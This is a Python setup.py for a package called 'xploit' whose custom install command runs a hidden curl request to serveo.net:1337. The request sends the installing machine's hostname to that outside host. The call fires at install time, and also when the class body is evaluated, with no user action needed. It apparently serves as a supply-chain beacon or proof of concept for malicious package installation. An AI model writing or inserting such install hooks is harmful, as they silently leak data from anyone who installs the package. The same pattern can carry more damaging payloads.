import os
import subprocess
import time
from setuptools import setup, find_packages
from setuptools.command.install import install


def RunCommand():
    # Touch a file in the current directory
    # Exec the following command: Run HTTP request to serveo.net:1337 and don't wait for the response
    hostname= os.uname()[1]
    subprocess.Popen(["curl", "-q","http://serveo.net:1337/"+str(hostname)])
    

    

class RunInstallCommand(install):
    RunCommand()
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "xploit",
    version = "0.0.2",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
    },
)
